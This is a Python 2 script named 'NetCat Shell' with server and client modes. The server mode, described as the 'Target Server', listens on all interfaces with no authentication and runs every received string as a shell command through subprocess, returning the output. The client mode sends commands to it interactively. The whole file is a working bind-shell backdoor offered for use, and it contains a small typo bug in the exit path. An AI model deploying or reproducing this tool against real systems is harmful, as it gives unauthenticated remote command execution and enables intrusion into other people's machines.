# -*- coding: utf-8 -*-

import sys
import socket
import argparse
import threading
import subprocess


class TargetServer(object):

    def __init__(self, port):
        self.port = port
        self.host = socket.gethostname()
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind(("0.0.0.0", int(self.port)))
        self.server.listen(10)

    def run(self):
        while 1:
            client_socket, client_addr = self.server.accept()
            client_thread = threading.Thread(target=self.client_handler,
                                             args=(client_socket,))
            client_thread.start()

    def client_handler(self, client_socket):
        client_socket.sendall("<@ %s $ >" % self.host)
        while 1:
            try:
                cmd_buffer = client_socket.recv(1024)
                response = self.run_command(cmd_buffer)
                if len(response) == 0:
                    response = "[Successful!]\n"
                client_socket.sendall(response)
            except Exception as e:
                # print e
                break

    def run_command(self, command):
        command = command.strip()
        try:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT,
                                             shell=True)
        except:
            output = '[*]Failed to execute command ! \n'

        return output


class Client(object):

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        try:
            self.client.connect((self.host, int(self.port)))
            header = self.client.recv(4096)
            command = raw_input(header)
            if command == "exit" or command == "quit":
                self.clien.close()
                sys.exit(0)
            self.client.sendall(command)
            while 1:
                recv_len = 1
                response = ""

                while recv_len:
                    data = self.client.recv(4096)
                    recv_len = len(data)
                    response += data
                    if recv_len < 4096:
                        break

                print(response)

                command = raw_input(header)
                if command == "exit" or command == "quit":
                    self.client.close()
                    break
                self.client.sendall(command)

        except:
            print("[*] Exception Failed ! \n")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="NetCat Shell")
    parser.add_argument("-s", "--server", help="Target Server",
                        action="store_true")
    parser.add_argument("-c", "--client", help="Client", action="store_true")
    parser.add_argument("--host", help="target host IP", action="store",
                        default="127.0.0.1")
    parser.add_argument("-p", "--port", help="target host port", action="store",
                        type=int)
    args = parser.parse_args()
    port = args.port
    if args.server:
        s = TargetServer(port)
        s.run()
    if args.client:
        host = args.host
        c = Client(host, port)
        c.run()

